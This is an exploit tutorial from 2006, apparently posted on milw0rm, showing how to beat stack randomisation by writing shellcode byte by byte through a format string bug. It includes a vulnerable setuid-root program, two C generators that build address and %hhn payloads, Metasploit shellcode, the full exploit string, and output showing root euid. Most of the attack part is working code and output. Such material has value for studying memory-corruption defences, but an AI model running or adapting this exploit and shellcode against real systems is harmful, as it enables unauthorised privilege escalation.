@@ -1,0 +1,326 @@
+                                                                     
+                                                                     
+                                                                     
+                                             
+  _  _  ___  ___  __  ___   __  ___     _  _  ___  ____ 
+ ( \/ )(_  )(_  )(  )(  ,) /  \(_  )   ( \( )(  _)(_  _)
+  )  (  / /  / /  )(  )  \( () )/ /  _  )  (  ) _)  )(  
+ (_/\_)(___)(___)(__)(_)\_)\__/(___)(_)(_)\_)(___) (__) 
+
+	       ... and 
+
+         ########.
+       ############.
+     ################
+    ##################.__ __ __ __ _ _ __ __
+   ##############/ _`|#\ V  V // _` | '_/ -_)
+   ##############\__,|# \_/\_/ \__,_|_| \___|
+   ###########*"*######
+   ##########{   }####*
+    ##########._.#####
+     ################
+      #############*
+         ########
+
+
+      Bring to you: 
+
+
+	.:An alternative method in format string exploitation:.
+                             10/10/2006
+
+[0] PREFACE
+
+	I assume you already know how a format string exploit functions. 
+You store your shellcode in a buffer, wheather it be an environemnt 
+variable, the format string's buffer, or a text field you had control 
+of. Using the format string you write a 4 byte address that represents 
+the location of this buffer, to a location that will cause code 
+execution at that point. Common places are the global destructor 
+segment (.dtors), a stored EIP that will later be popped and returned 
+to, or in more exotic cases segments such as the global offset table (.got).
+
+	This is all well and good, but does anyone see the problem with 
+these methods? The problem lies in yestordays future, today to be 
+precise. A day and age where these common bugs are not only more rare 
+than ever, but harder to exploit all together. Patches such as VA 
+randomization cause for new methods to be uncoverred and alternative 
+approaches to be taken. Lately I have read articles on buffer overflow 
+advances, including but not limited to returning to esp, ret sledding, 
+register calls and the like. I have yet to see anything on format 
+string exploitation (although the ammount of possibilities are, imho, 
+just as large). 
+
+[1] THEORY
+
+	My theory works off of the bases that you can randomize a stack 
+as much as you want, but the distance between variables is still static 
+(at least in the same segment). Not only does this allow you to brute 
+force one address and obtain all of the rest based on their distance from 
+the variable that you brute forced, but it also allows format string 
+exploitation to function in it's ancient way. I am referring to
+%<this>$hn number in our format string.
+
+	Randomized VA breaks a normal format string by not allowing 
+you know where the shellcode is located at, as it's address will change 
+(hence, "random VA") But what if we take the authority and specify the 
+location our shellcode is located at? Then all you have to do is write 
+that same address to to your point of execution flow (eip, .dtors, 
+.got). How might one accomplish such an insanity? Simple! Instead of 
+writing just 4 bytes to a location, we use the format string to write 
+the entire shellcode to a location, byte for byte. 
+
+[2] PRACTICE
+
+	I will begin by formally showing you the code we will exploit, 
+it is both generic and simple. Text is requested for input, and that 
+same text is printed to stdout. 
+
+-- begin fmat.c 
+
+#include <stdio.h>
+#include <unistd.h>
+int main (int argc, char **argv) {
+	char buff[2048];
+	int i;
+
+	i = fread(buff, 1, 2048, stdin);
+	        *(buff+i) = 0;
+	
+	printf(buff);
+	return(0);
+}
+
+-- end fmat.c --
+
+	Great! Next we need to create the string.
+
+[3] ADDRESSES
+
+	The first part of our string will consist of the addresses. All 
+of these addresses point to a byte since i'll be demonstrating this 
+with %hhn. The first 4 addresses will be the location of where we 
+will write our shellcode's address and hence the location that causes 
+code execution to be diverted. For this I will choose the .dtor (global 
+destructors) segment. Once this is accomplished, upon program exit any 
+function address in it will be executed. We want to place the address 
+at .dtors+4. What is the address of .dtors? 
+
+xzziroz:/home/kspecial# ls -alh fmat
+-rwsr-xr-x 1 root kspecial 7.1K 2006-10-12 00:09 fmat
+xzziroz:/home/kspecial# objdump -x fmat | grep dtors | head -1
+ 16 .dtors        00000008  08049544  08049544  00000544  2**2
+xzziroz:/home/kspecial#
+
+	Great, now let me show you the code i've written to make 
+the addresses:
+
+-- begin addy2fmat.c --
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main (int argc, char **argv) {
+        unsigned addy, length;
+        char *ptr = (char *) &addy;
+
+        if (argc < 3)
+                exit(1);
+
+        sscanf(*(argv+1), "%x", &addy);
+        sscanf(*(argv+2), "%u", &length);
+
+        for (; length; length--, addy++)
+                printf("\\x%hhx\\x%hhx\\x%hhx\\x%hhx", *ptr, *(ptr+1), *(ptr+2), *(ptr+3));
+
+        putchar('\n');
+
+        return;
+}
+
+-- end addy2fmat.c --
+
+xzziroz:/home/kspecial# ./addy2fmat 08049548 4
+\x48\x95\x4\x8\x49\x95\x4\x8\x4a\x95\x4\x8\x4b\x95\x4\x8
+xzziroz:/home/kspecial#
+
+	These are the 4 addresses that each point to a byte of the 4
+byte address we want to write to (.dtors+4,5,6,7)
+
+	Now we have to make the addresses for each byte of our 
+shellcode that will be written. You can put the shellcode anywhere 
+that is writeable and does not cause disturbance with the rest of 
+the program between the time it's written and when code execution 
+occures. I am going to place mine right next to the dtors in a 
+section gcc labels _DYNAMIC:
+
+(gdb) x/100a 0x08049548
+0x8049548 <__DTOR_END__>:       0x0     0x0     0x1     0x10
+0x8049558 <_DYNAMIC+8>: 0xc     0x80482a0 <_init>       0xd     0x8048514 <_fini>
+0x8049568 <_DYNAMIC+24>:        0x4     0x8048148       0x5     0x80481e8
+0x8049578 <_DYNAMIC+40>:        0x6     0x8048178       0xa     0x58
+0x8049588 <_DYNAMIC+56>:        0xb     0x10    0x15    0xb7f894e4 <_r_debug>
+0x8049598 <_DYNAMIC+72>:        0x3     0x804961c <_GLOBAL_OFFSET_TABLE_>       0x2     0x20
+0x80495a8 <_DYNAMIC+88>:        0x14    0x11    0x17    0x8048280
+0x80495b8 <_DYNAMIC+104>:       0x11    0x8048270       0x12    0x10
+0x80495c8 <_DYNAMIC+120>:       0x13    0x8     0x6ffffffe      0x8048250
+0x80495d8 <_DYNAMIC+136>:       0x6fffffff      0x1     0
+0x80495e8 <_DYNAMIC+152>:       0x0     0x0     0x0     0x0
+0x80495f8 <_DYNAMIC+168>:       0x0     0x0     0x0     0x0
+0x8049608 <_DYNAMIC+184>:       0x0     0x0     0x0     0x0
+...
+
+	0x80495b0 looks like a good place.
+
+	This is the shellcode i'll be using, it is 72 bytes 
+and does a system() of /usr/bin/id
+
+"\x33\xc9\x83\xe9\xf4\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x3b"
+"\x6e\x15\xe2\x83\xeb\xfc\xe2\xf4\x51\x65\x4d\x7b\x69\x08\x7d\xcf"
+"\x58\xe7\xf2\x8a\x14\x1d\x7d\xe2\x53\x41\x77\x8b\x55\xe7\xf6\xb0"
+"\xd3\x62\x15\xe2\x3b\x41\x60\x91\x49\x41\x77\x8b\x55\x41\x7c\x86"
+"\x3b\x39\x46\x6b\xda\xa3\x95\xe2";
+
+	Oh, this is from metasploit by the way.
+
+	So now we use the same program to make 72 addresses 
+starting at 0x80495b0:
+
+kspecial@xzziroz:~$ ./addy2fmat 0x80495b0 72
+\xb0\x95\x4\x8\xb1\x95\x4\x8\xb2\x95\x4\x8\xb3\x95\x4\x8\xb4\x95\x4\x8\xb5\x95\x4\x8\xb6\x95\x4\x8\xb7\x95\x4\x8\xb8\x95\x4\x8\xb9\x95\x4\x8\xba\x95\x4\x8
+\xbb\x95\x4\x8\xbc\x95\x4\x8\xbd\x95\x4\x8\xbe\x95\x4\x8\xbf\x95\x4\x8\xc0\x95\x4\x8\xc1\x95\x4\x8\xc2\x95\x4\x8\xc3\x95\x4\x8\xc4\x95\x4\x8\xc5\x95\x4\x8
+\xc6\x95\x4\x8\xc7\x95\x4\x8\xc8\x95\x4\x8\xc9\x95\x4\x8\xca\x95\x4\x8\xcb\x95\x4\x8\xcc\x95\x4\x8\xcd\x95\x4\x8\xce\x95\x4\x8\xcf\x95\x4\x8\xd0\x95\x4\x8
+\xd1\x95\x4\x8\xd2\x95\x4\x8\xd3\x95\x4\x8\xd4\x95\x4\x8\xd5\x95\x4\x8\xd6\x95\x4\x8\xd7\x95\x4\x8\xd8\x95\x4\x8\xd9\x95\x4\x8\xda\x95\x4\x8\xdb\x95\x4\x8
+\xdc\x95\x4\x8\xdd\x95\x4\x8\xde\x95\x4\x8\xdf\x95\x4\x8\xe0\x95\x4\x8\xe1\x95\x4\x8\xe2\x95\x4\x8\xe3\x95\x4\x8\xe4\x95\x4\x8\xe5\x95\x4\x8\xe6\x95\x4\x8
+\xe7\x95\x4\x8\xe8\x95\x4\x8\xe9\x95\x4\x8\xea\x95\x4\x8\xeb\x95\x4\x8\xec\x95\x4\x8\xed\x95\x4\x8\xee\x95\x4\x8\xef\x95\x4\x8\xf0\x95\x4\x8\xf1\x95\x4\x8
+\xf2\x95\x4\x8\xf3\x95\x4\x8\xf4\x95\x4\x8\xf5\x95\x4\x8\xf6\x95\x4\x8\xf7\x95\x4\x8
+
+	Great! We're all done with the addresses.
+
+[4] DATA
+
+	Now it's time to write the data to these addresses. First we 
+need to write a \xb0\x95\x4\x8 since this will be placed at 0x8049548 
+(.dtors+4). After that, we need to write the shellcode. To make 
+format string identifiers out of the data, i use more code that does 
+all the work for me!
+
+-- begin sc2fmat --
+
+#include <stdio.h>
+
+int main (int argc, char **argv) {
+        unsigned char last = 0;
+        unsigned value; unsigned start_ord = 0;
+        char *ptr = *(argv+1);
+
+        if (argc > 2)
+                sscanf(*(argv+2), "%u", &start_ord);
+
+        if (argc > 3)
+                sscanf(*(argv+3), "%hhu", &last);
+
+        for (unsigned i = 256; *ptr; ptr++, start_ord++, i += 256) {
+                value = *ptr;
+
+                if (last) {
+                        value += i;
+                        value -= last;
+                }
+
+
+                printf("%%%uu%%%u$hhn", value + (i * 256), start_ord);
+
+                last = *ptr;
+        }
+        putchar('\n');
+}
+
+-- end sc2fmat.c --
+
+	To run this, one must simply provide the data you wish to be 
+converted (the 4 byte address, and then our shellcode), followed by 
+the stack pop distance (the distance from ESP that our buffer 
+holding all of this data lies at). After the stack pop you must 
+specify how many characters have already been written (with the 
+addresses). In other words, we take the two address sets made above, 
+and calculate how many bytes they take up. Mine should take up 
+76 * 4 (72 4 byte addresses for the shellcode, and four, 4 byte 
+addresses for the address of the shellcode). echo -en 
+'<addresses>' | wc -c Confirms it is 304 bytes being taken up by 
+the addresses. My buffer is 8 bytes away from ESP at the time printf
+executes, by placing a break on printf and examining $esp + 32 I can 
+verify this:
+
+Breakpoint 1, 0x0804840b in main ()
+(gdb) x/a $esp + 32
+0xbfdd3430:     0x8049548 <__DTOR_END__>
+
+	That is the first address in buff[], so let's make it:
+
+kspecial@xzziroz:~$ ./sc2fmat `echo -en '\xb0\x95\x4\x8\x33\xc9\x83\xe9\xf4\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x3b\x6e\x15\xe2\x83\xeb\xfc\xe2\xf4\x51
+\x65\x4d\x7b\x69\x8\x7d\xcf\x58\xe7\xf2\x8a\x14\x1d\x7d\xe2\x53\x41\x77\x8b\x55\xe7\xf6\xb0\xd3\x62\x15\xe2\x3b\x41\x60\x91\x49\x41\x77\x8b\x55\x41\x7c\x86
+\x3b\x39\x46\x6b\xda\xa3\x95\xe2'` 8 304
+%65664u%8$hhn%131301u%9$hhn%197231u%10$hhn%263172u%11$hhn%329003u%12$hhn%394646u%13$hhn%460218u%14$hhn%526182u%15$hhn%591883u%16$hhn%657637u%17$hhn%723477u
+%18$hhn%789227u%19$hhn%855195u%20$hhn%921008u%21$hhn%986832u%22$hhn%1052519u%23$hhn%1118246u%24$hhn%1184242u%25$hhn%1249952u%26$hhn%1315880u%27$hhn%1381683
+u%28$hhn%1447335u%29$hhn%1513165u%30$hhn%1578657u%31$hhn%1644648u%32$hhn%1710353u%33$hhn%1776102u%34$hhn%1841938u%35$hhn%1907805u%36$hhn%1973780u%37$hhn
+%2039528u%38$hhn%2105390u%39$hhn%2171118u%40$hhn%2236831u%41$hhn%2302837u%42$hhn%2368338u%43$hhn%2434185u%44$hhn%2499983u%45$hhn%2565643u%46$hhn%2631320u
+%47$hhn%2697354u%48$hhn%2763273u%49$hhn%2829152u%50$hhn%2894693u%51$hhn%2960497u%52$hhn%3026414u%53$hhn%3092278u%54$hhn%3157780u%55$hhn%3223754u%56$hhn
+%3289490u%57$hhn%3355151u%58$hhn%3420858u%59$hhn%3486755u%60$hhn%3552655u%61$hhn%3618483u%62$hhn%3684301u%63$hhn%3749977u%64$hhn%3815942u%65$hhn%3881759u
+%66$hhn%3947313u%67$hhn%4013240u%68$hhn%4079096u%69$hhn%4144950u%70$hhn%4210452u%71$hhn%4276426u%72$hhn%4342252u%73$hhn%4408123u%74$hhn%4473610u%75$hhn
+%4539573u%76$hhn%4605438u%77$hhn%4671245u%78$hhn%4737061u%79$hhn%4802671u%80$hhn%4868297u%81$hhn%4934130u%82$hhn%5000013u%83$hhn
+kspecial@xzziroz:~$
+
+	\xb0\x95\x4\x8 will get written to .dtors+4 (each of thoes
+bytes corresponds to the first four, 4 byte addresses in our 
+addresses) The rest of it will get written to the other addresses 
+(where we choose to park the shellcode) On program termination our 
+shellcode will be executed, let's try it!
+
+echo -en '\x48\x95\x4\x8\x49\x95\x4\x8\x4a\x95\x4\x8\x4b\x95\x4\x8\xb0\x95\x4\x8\xb1\x95\x4\x8\xb2\x95\x4\x8\xb3\x95\x4\x8\xb4\x95\x4\x8\xb5\x95\x4\x8\xb6
+\x95\x4\x8\xb7\x95\x4\x8\xb8\x95\x4\x8\xb9\x95\x4\x8\xba\x95\x4\x8\xbb\x95\x4\x8\xbc\x95\x4\x8\xbd\x95\x4\x8\xbe\x95\x4\x8\xbf\x95\x4\x8\xc0\x95\x4\x8\xc1
+\x95\x4\x8\xc2\x95\x4\x8\xc3\x95\x4\x8\xc4\x95\x4\x8\xc5\x95\x4\x8\xc6\x95\x4\x8\xc7\x95\x4\x8\xc8\x95\x4\x8\xc9\x95\x4\x8\xca\x95\x4\x8\xcb\x95\x4\x8\xcc
+\x95\x4\x8\xcd\x95\x4\x8\xce\x95\x4\x8\xcf\x95\x4\x8\xd0\x95\x4\x8\xd1\x95\x4\x8\xd2\x95\x4\x8\xd3\x95\x4\x8\xd4\x95\x4\x8\xd5\x95\x4\x8\xd6\x95\x4\x8\xd7
+\x95\x4\x8\xd8\x95\x4\x8\xd9\x95\x4\x8\xda\x95\x4\x8\xdb\x95\x4\x8\xdc\x95\x4\x8\xdd\x95\x4\x8\xde\x95\x4\x8\xdf\x95\x4\x8\xe0\x95\x4\x8\xe1\x95\x4\x8\xe2
+\x95\x4\x8\xe3\x95\x4\x8\xe4\x95\x4\x8\xe5\x95\x4\x8\xe6\x95\x4\x8\xe7\x95\x4\x8\xe8\x95\x4\x8\xe9\x95\x4\x8\xea\x95\x4\x8\xeb\x95\x4\x8\xec\x95\x4\x8\xed
+\x95\x4\x8\xee\x95\x4\x8\xef\x95\x4\x8\xf0\x95\x4\x8\xf1\x95\x4\x8\xf2\x95\x4\x8\xf3\x95\x4\x8\xf4\x95\x4\x8\xf5\x95\x4\x8\xf6\x95\x4\x8\xf7\x95\x4\x8
+%65664u%8$hhn%131301u%9$hhn%197231u%10$hhn%263172u%11$hhn%329003u%12$hhn%394646u%13$hhn%460218u%14$hhn%526182u%15$hhn%591883u%16$hhn%657637u%17$hhn
+%723477u%18$hhn%789227u%19$hhn%855195u%20$hhn%921008u%21$hhn%986832u%22$hhn%1052519u%23$hhn%1118246u%24$hhn%1184242u%25$hhn%1249952u%26$hhn%1315880u
+%27$hhn%1381683u%28$hhn%1447335u%29$hhn%1513165u%30$hhn%1578657u%31$hhn%1644648u%32$hhn%1710353u%33$hhn%1776102u%34$hhn%1841938u%35$hhn%1907805u%36$hhn
+%1973780u%37$hhn%2039528u%38$hhn%2105390u%39$hhn%2171118u%40$hhn%2236831u%41$hhn%2302837u%42$hhn%2368338u%43$hhn%2434185u%44$hhn%2499983u%45$hhn%2565643u
+%46$hhn%2631320u%47$hhn%2697354u%48$hhn%2763273u%49$hhn%2829152u%50$hhn%2894693u%51$hhn%2960497u%52$hhn%3026414u%53$hhn%3092278u%54$hhn%3157780u%55$hhn
+%3223754u%56$hhn%3289490u%57$hhn%3355151u%58$hhn%3420858u%59$hhn%3486755u%60$hhn%3552655u%61$hhn%3618483u%62$hhn%3684301u%63$hhn%3749977u%64$hhn%3815942u
+%65$hhn%3881759u%66$hhn%3947313u%67$hhn%4013240u%68$hhn%4079096u%69$hhn%4144950u%70$hhn%4210452u%71$hhn%4276426u%72$hhn%4342252u%73$hhn%4408123u%74$hhn
+%4473610u%75$hhn%4539573u%76$hhn%4605438u%77$hhn%4671245u%78$hhn%4737061u%79$hhn%4802671u%80$hhn%4868297u%81$hhn%4934130u%82$hhn%5000013u%83$hhn' > file
+
+kspecial@xzziroz:~$ ./fmat < file | tail -c 200
+                                                uid=1000(kspecial) gid=1000(kspecial) euid=0(root) groups=20(dialout),24(cdrom),25(floppy),29(audio),44(video),46(plugdev),107(powerdev),1000(kspecial)
+
+	Awesome, it works. We place the format string into 'file' 
+and feed it to printf, at the end of printing out ~150 megabytes 
+worth of nonsense it runs our shellcode. I can execute ./fmat 
+< file | tail -c 200 as many times in a row and it keeps working 
+because we only used one (kinda) unknown address, the .dtors, but 
+the .dtors is static! Yes that might be the biggest and uggliest 
+format string you've seen in your life, but that leads us to the 
+next chapter.
+
+[5] SIZE
+
+	You could easily get the size of my format string at 
+least cut in half (at least) using the following methods:
+
+	1. Smaller shellcode is obvious
+	2. Write your processor's word size using %n instead of 
+	   %hhn effectively shrinking your format string by 4
+	3. By understanding sc2fmat.c more than I do and making 
+	   each stack pop number 3 digits or less.
+
+[6] EPILOGUE
+
+	I hope you guys enjoyed that, 
+I now i did! Weeeeeeeeeeeee.
+
+--K-sPecial
+
+# milw0rm.com [2006-10-18]
